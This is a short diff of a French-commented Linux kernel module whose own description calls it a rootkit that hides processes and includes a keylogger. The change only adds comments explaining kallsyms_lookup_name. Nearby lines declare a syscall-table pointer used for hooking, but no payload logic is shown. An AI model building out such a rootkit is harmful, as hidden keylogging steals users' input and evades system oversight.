@@ -16,7 +16,8 @@ MODULE_LICENSE("GPL");                         // Licence du module
 MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez"); // Auteur(s) du module
 MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré"); // Description du module
 
-// Déclaration de kallsyms_lookup_name pour trouver des symboles dans le noyau
+// Déclaration de kallsyms_lookup_name pour trouver des symboles dans le noyau, en gros c'est une fonction du noyau Linux ca permet de trouver l'adresse de fonctions ou de variables dans le noyau en utilisant simplement leur nom
+// un peu comme si tu avait un annuaire qui te dit exactement ou est ce que tu cherche
 static unsigned long (*kallsyms_lookup_name)(const char *name);
 
 unsigned long *syscall_table;                  // Pointeur vers la table des appels système
